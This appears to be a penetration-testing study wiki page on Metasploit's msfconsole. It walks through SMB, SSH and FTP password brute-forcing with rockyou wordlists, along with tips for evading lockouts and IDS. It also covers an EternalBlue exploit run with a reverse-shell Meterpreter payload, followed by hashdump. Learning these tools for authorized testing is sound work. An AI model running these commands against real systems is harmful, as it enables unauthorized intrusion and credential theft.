---
tags: [tool, attack, enumeration]
module: multi
last_updated: 2026-05-11
source_count: 0
---

# Metasploit Framework (msfconsole)

Metasploit is a modular exploitation and post-exploitation framework. `msfconsole` is its interactive console — the standard interface for running exploits, auxiliary scanners, and credential attacks.

## Overview

Metasploit organizes everything into **modules** by type. You `use` a module, `set` options, then `run` it. Nothing executes until you explicitly run a module — the main `msf6>` prompt is just navigation.

```
Module types:
  auxiliary/   — scanners, brute-forcers, fuzzers, discovery (no shell)
  exploit/     — vulnerability exploitation (opens a session)
  post/        — post-exploitation (runs on an existing session)
  payload/     — code delivered via exploit (reverse shell, meterpreter)
  encoder/     — payload obfuscation
```

Install / launch:
```bash
sudo apt install metasploit-framework   # Kali/Parrot: pre-installed
msfconsole                              # launch
msfconsole -q                           # launch without banner
```

---

## Core Workflow

```bash
msf6> search smb login              # find relevant modules
msf6> use auxiliary/scanner/smb/smb_login   # select a module
msf6> info                          # show all options and description
msf6> options                       # show current option values
msf6> set RHOSTS 10.10.10.10        # set target(s)
msf6> set USER_FILE /path/users.txt # set option from file
msf6> run                           # execute (alias: exploit)
msf6> back                          # return to main prompt without a module
msf6> sessions                      # list active sessions
msf6> sessions -i 1                 # interact with session 1
```

> **Common mistake:** `run` only works inside a module. Typing `run` at the main `msf6>` prompt returns an error. Always `use <module>` first.

---

## Credential Brute-Force Modules

These are `auxiliary` modules — they test credentials but do not open a shell on their own.

### SMB Login (smb_login) — primary brute-force for SMB

```bash
msf6> use auxiliary/scanner/smb/smb_login
msf6> set RHOSTS 10.10.10.10
msf6> set SMBUser jason              # single known username
msf6> set PASS_FILE /usr/share/wordlists/rockyou.txt
msf6> set STOP_ON_SUCCESS true       # stop as soon as a password is found
msf6> set THREADS 5                  # keep low to avoid lockout (default 1)
msf6> set VERBOSE false              # suppress failed attempts (cleaner output)
msf6> run
```

With a user file instead:
```bash
msf6> set USER_FILE /usr/share/seclists/Usernames/top-usernames-shortlist.txt
msf6> set PASS_FILE /usr/share/seclists/Passwords/Common-Credentials/top-passwords-shortlist.txt
msf6> set BRUTEFORCE_SPEED 3         # 0 (slowest/stealthiest) to 5 (fastest)
msf6> run
```

Successful output looks like:
```
[+] 10.10.10.10:445 - Success: '.\jason:princess1' (Pwn3d!)
```
`Pwn3d!` means the account has local admin rights.

### SSH Login

```bash
msf6> use auxiliary/scanner/ssh/ssh_login
msf6> set RHOSTS 10.10.10.10
msf6> set USERNAME root
msf6> set PASS_FILE /usr/share/wordlists/rockyou.txt
msf6> set STOP_ON_SUCCESS true
msf6> set THREADS 4                  # SSH is slow; keep threads low
msf6> run
```

### FTP Login

```bash
msf6> use auxiliary/scanner/ftp/ftp_login
msf6> set RHOSTS 10.10.10.10
msf6> set USER_FILE /usr/share/seclists/Usernames/top-usernames-shortlist.txt
msf6> set PASS_FILE /usr/share/wordlists/rockyou.txt
msf6> set STOP_ON_SUCCESS true
msf6> run
```

### Other Common Login Modules

| Module | Service |
|--------|---------|
| `auxiliary/scanner/mssql/mssql_login` | MSSQL |
| `auxiliary/scanner/mysql/mysql_login` | MySQL |
| `auxiliary/scanner/vnc/vnc_login` | VNC |
| `auxiliary/scanner/telnet/telnet_login` | Telnet |
| `auxiliary/scanner/http/http_login` | HTTP Basic Auth |

---

## Discovery / Enumeration Modules

```bash
# SMB version + info
msf6> use auxiliary/scanner/smb/smb_version
msf6> set RHOSTS 10.10.10.0/24
msf6> run

# IPMI version discovery
msf6> use auxiliary/scanner/ipmi/ipmi_version

# IPMI hash dump (RAKP flaw)
msf6> use auxiliary/scanner/ipmi/ipmi_dumphashes

# MSSQL ping/discovery
msf6> use auxiliary/scanner/mssql/mssql_ping

# Port scan (alternative to nmap — works from inside Meterpreter)
msf6> use auxiliary/scanner/portscan/tcp
msf6> set RHOSTS 10.10.10.0/24
msf6> set PORTS 22,80,443,445,3389
msf6> run
```

---

## Exploitation Workflow

```bash
# 1. Find a module
msf6> search eternalblue
msf6> search type:exploit name:smb

# 2. Use it
msf6> use exploit/windows/smb/ms17_010_eternalblue

# 3. Set target and payload
msf6> set RHOSTS 10.10.10.10
msf6> set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6> set LHOST <your-IP>
msf6> set LPORT 4444

# 4. Check required options
msf6> options

# 5. Run
msf6> run

# 6. Once you have a Meterpreter session
meterpreter> sysinfo
meterpreter> getuid
meterpreter> hashdump
meterpreter> shell
```

---

## Flags & Options

### Universal Options

| Option | Description |
|--------|-------------|
| `RHOSTS` | Target IP, range, CIDR, or file (`file:/path/to/list.txt`) |
| `RPORT` | Target port (set automatically by most modules) |
| `LHOST` | Your IP (for reverse connections) |
| `LPORT` | Your listener port (for reverse connections) |
| `THREADS` | Parallel threads — keep low for brute-force to avoid lockout |
| `VERBOSE` | Show all attempts; set to `false` for cleaner brute-force output |
| `STOP_ON_SUCCESS` | Halt the module as soon as one credential succeeds |

### Search Filters

```bash
msf6> search type:exploit platform:windows name:smb
msf6> search cve:2017-0144
msf6> search author:hdm
```

---

## MSF vs NetExec vs Hydra — When to Use Which

| Scenario | Best Tool | Why |
|----------|-----------|-----|
| Brute-force one account with rockyou | **MSF smb_login** | `STOP_ON_SUCCESS`, reliable with large files, built-in threading control |
| Spray one password across many users | **NetExec** | Designed for lateral movement; fast across /24 subnets; `--continue-on-success` |
| Validate known credentials across a subnet | **NetExec** | Instant `[+]` / `[-]` output per host; stores results in DB |
| Brute-force SSH/FTP/HTTP | **Hydra** | Faster than MSF for non-SMB protocols; simple syntax |
| Need a session after brute-force | **MSF smb_login** | Can open a Meterpreter session directly with `CreateSession true` |
| Brute-force from inside a pivot | **MSF** | Runs natively inside an established Meterpreter session |

**Key distinction:** NetExec is a credential *validator and sprayer*. It works best with a short password list across many hosts or users. MSF's `smb_login` is a true *brute-forcer* — optimized for trying a large wordlist against a specific account with proper stop-on-success handling.

---

## Gotchas & Notes

- **`run` at the main prompt doesn't work.** You must `use <module>` first. The main `msf6>` prompt is navigation only.
- **`STOP_ON_SUCCESS true` is essential with large wordlists.** Without it, MSF will test all 14 million rockyou passwords even after finding the correct one.
- **rockyou.txt must be unzipped first.** `/usr/share/wordlists/rockyou.txt.gz` needs `gunzip` before MSF (or any tool) can use it. MSF will silently fail or find no matches if given the `.gz` file.
- **THREADS should stay low for SMB brute-force** (3–5 max). High thread counts trigger lockouts and IDS alerts. Default is 1.
- **`BRUTEFORCE_SPEED`** controls the delay between attempts (0 = slowest, 5 = fastest). Use 2–3 on lab networks to avoid overwhelming the target.
- **CreateSession option (MSF 6.4+):** `smb_login` can open an interactive session immediately after finding valid credentials — set `CreateSession true` to enable.
- **Database:** MSF stores all results in a PostgreSQL database. Start with `msfdb init` and query with `creds`, `hosts`, `services`, and `loot` commands in the console.

## Related Pages

- [[tools/netexec]] — when to use CME vs MSF
- [[tools/hydra]] — faster for non-SMB brute-force
- [[enumeration/smb]]
- [[enumeration/windows_remote_mgmt]]
- [[attack/smb]]
